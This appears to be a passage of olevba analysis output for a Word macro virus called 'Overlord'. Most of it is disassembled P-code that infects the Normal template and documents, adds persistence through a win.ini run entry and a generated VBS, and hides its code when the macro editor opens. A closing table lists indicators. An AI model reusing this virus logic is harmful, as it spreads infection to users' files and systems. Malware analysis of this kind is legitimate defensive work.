' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #18:
' 	Ld windir 
' 	LitStr 0x000B "\tempad.dll"
' 	Concat 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #19:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0012 "'MyName = Overlord"
' 	Ne 
' 	IfBlock 
' Line #22:
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	Ld windir 
' 	LitStr 0x000B "\tempnt.dll"
' 	Concat 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	LitStr 0x000C "c:\Himem.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #28:
' 	LitStr 0x000C "c:\Himem.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #29:
' 	LitStr 0x000C "c:\Himem.sy_"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #30:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld Like 
' 	InputItem 
' 	InputDone 
' Line #32:
' 	Ld Like 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' 	EndIf 
' Line #33:
' 	Loop 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #35:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #36:
' Line #37:
' 	LitStr 0x000C "c:\Himem.sys"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #38:
' 	LitStr 0x000C "c:\Himem.sy_"
' 	LitStr 0x000C "c:\Himem.sys"
' 	ArgsCall FileCopy 0x0002 
' Line #39:
' 	LitStr 0x000C "c:\Himem.sy_"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Sub AutoOpen())
' Line #44:
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #47:
' Line #48:
' 	LitStr 0x000C "c:\Himem.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #51:
' Line #52:
' 	EndSub 
' Line #53:
' Line #54:
' 	FuncDefn (Sub Stealth())
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' Line #57:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St windir 
' Line #58:
' Line #59:
' 	LitStr 0x000C "the Overlord"
' 	LitStr 0x0000 ""
' 	LitStr 0x001C "HKEY_LOCAL_MACHINE\software\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #60:
' Line #61:
' 	Ld windir 
' 	LitStr 0x0008 "\win.ini"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #62:
' 	LitStr 0x000A "c:\win._ni"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #63:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #64:
' 	LitDI2 0x0001 
' 	Ld Like 
' 	LineInput 
' Line #65:
' 	Ld Like 
' 	LitStr 0x0009 "[windows]"
' 	Eq 
' 	IfBlock 
' Line #66:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "run = "
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\overlord.b.vbs"
' 	Concat 
' 	PrintItemNL 
' Line #68:
' 	ElseBlock 
' Line #69:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Like 
' 	PrintItemNL 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	Loop 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #73:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #74:
' Line #75:
' 	LitStr 0x000A "c:\win._ni"
' 	Ld windir 
' 	LitStr 0x0008 "\win.ini"
' 	Concat 
' 	ArgsCall FileCopy 0x0002 
' Line #76:
' 	LitStr 0x000A "c:\win._ni"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #77:
' Line #78:
' 	Ld windir 
' 	LitStr 0x000F "\overlord.b.vbs"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000F "\overlord.b.vbs"
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #79:
' Line #80:
' 	LitStr 0x0019 "c:\windows\overlord.b.vbs"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On error resume next"
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Set WordObj = CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Word.Application"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "WordObj.Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Module"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "WordObj.NormalTemplate.save"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "WordObj.NormalTemplate.VBProject.VBComponents.import ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld windir 
' 	Concat 
' 	LitStr 0x000F "\overlord.b.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "WordObj.NormalTemplate.save"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Dim FSO"
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "Set FSO = CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "set a =  FSO.OpenTextFile("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.sys"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ", 1, True)"
' 	Concat 
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "contents = a.readall()"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "a.close"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "set b =  FSO.OpenTextFile("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ", 2, True)"
' 	Concat 
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "b.write(contents)"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "b.close"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "set a =  FSO.OpenTextFile("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A ", 1, True)"
' 	Concat 
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Do While a.atendofstream <> True"
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "documentname = a.readline"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If documentname <> "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "WordObj.Documents.open (documentname)"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "WordObj.activedocument.save"
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "WordObj.activedocument.close"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End if"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Loop"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "a.close"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "set NT = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "WordObj.Quit"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "fso.deletefile"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.sys"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "fso.deletefile"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "c:\himem.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #113:
' Line #114:
' 	Ld windir 
' 	LitStr 0x000F "\overlord.b.dll"
' 	Concat 
' 	Paren 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #115:
' Line #116:
' 	EndSub 
' Line #117:
' 	FuncDefn (Sub ViewVBCode())
' Line #118:
' 	OnError (Resume Next) 
' Line #119:
' Line #120:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #121:
' Line #122:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #123:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #124:
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #125:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #126:
' Line #127:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St Docnumber 
' Line #128:
' 	Ld Docnumber 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #129:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docnumber 
' 	For 
' Line #130:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #131:
' 	LitVarSpecial (True)
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #132:
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #133:
' 	LitVarSpecial (True)
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #134:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #135:
' 	EndIfBlock 
' Line #136:
' Line #137:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #138:
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub ToolsMacro())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' Line #143:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	For 
' Line #144:
' 	Ld codeNT 
' 	Ld x 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St codeNT 
' Line #145:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #146:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #147:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #148:
' Line #149:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St Docnumber 
' Line #150:
' 	Ld Docnumber 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #151:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	For 
' Line #152:
' 	Ld CodeAD 
' 	Ld y 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St CodeAD 
' Line #153:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #154:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docnumber 
' 	For 
' Line #155:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #156:
' 	LitVarSpecial (True)
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #157:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #158:
' 	EndIfBlock 
' Line #159:
' Line #160:
' 	Ld wdDialogToolsMacro 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #161:
' Line #162:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #163:
' 	LitDI2 0x0001 
' 	Ld codeNT 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #164:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #165:
' Line #166:
' 	Ld Docnumber 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #167:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docnumber 
' 	For 
' Line #168:
' 	LitDI2 0x0001 
' 	Ld CodeAD 
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #169:
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd FullName 
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #170:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #171:
' 	EndIfBlock 
' Line #172:
' 	EndIfBlock 
' Line #173:
' 	EndSub 
' Line #174:
' Line #175:
' 	QuoteRem 0x0000 0x004F "Put this code in a module called "Module". This is another version of overlord."
' Line #176:
' 	QuoteRem 0x0000 0x0049 "It uses a different stealth mechanism. Again however not perfect stealth,"
' Line #177:
' 	QuoteRem 0x0000 0x002A "but perhaps also a nice attempt i hope :)."
' Line #178:
' Line #179:
' Line #180:
' Line #181:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tempad.dll          |Executable file name                         |
|IOC       |tempnt.dll          |Executable file name                         |
|IOC       |b.vbs               |Executable file name                         |
|IOC       |b.dll               |Executable file name                         |
|IOC       |himem.dll           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

